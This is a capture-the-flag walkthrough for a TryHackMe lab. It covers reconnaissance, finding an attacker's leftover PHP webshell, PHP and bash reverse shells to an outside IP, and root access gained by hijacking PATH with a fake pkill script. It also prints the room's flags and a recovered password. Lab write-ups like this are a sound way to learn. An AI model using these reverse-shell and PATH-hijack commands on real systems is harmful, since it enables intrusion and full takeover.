# [Challenge](https://tryhackme.com/room/hackervshacker)

# ENUM
## nmap (`nmap -A -p- -T4 --min-rate 5000 hvh`)
```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# EXPLOITATION
```php
$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
```
Maybe the hacker has already uploaded the shell... let's check: `ffuf -u "http://hvh/cvs/FUZZ.pdf.php" -w /usr/share/seclists/Discovery/Web-Content/common.txt`
`shell                   [Status: 200, Size: 18, Words: 1, Lines: 2, Duration: 60ms]`
Perfect! Let's also check the parameters: `ffuf -u "http://hvh/cvs/shell.pdf.php?FUZZ=id" -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -fw 1` -> `cmd` here we are! Let's do a revshell: `php%20-r%20%27%24sock%3Dfsockopen%28%2210.8.13.111%22%2C4444%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27` (normal: `php -r '$sock=fsockopen("10.8.13.111",4444);exec("bash <&3 >&3 2>&3");')
Let's also open an interactive shell: `python3 -c "import pty;pty.spawn('/bin/bash')"`
`user.txt`: `thm{af7e46b68081d4025c5ce10851430617}`
# PRIVILEGE ESCALATION
In `/home/lachlan/.bash_history` there's his password: `thisistheway123`
In the file there's also a path to a cron file: ``
```bash
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```
Let's make a script called `pkill` in `/home/lachlan/bin` (path):
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.8.13.111/5555 0>&1
```
Let's wait and... we're ROOT!
`root.txt`: `thm{7b708e5224f666d3562647816ee2a1d4}`
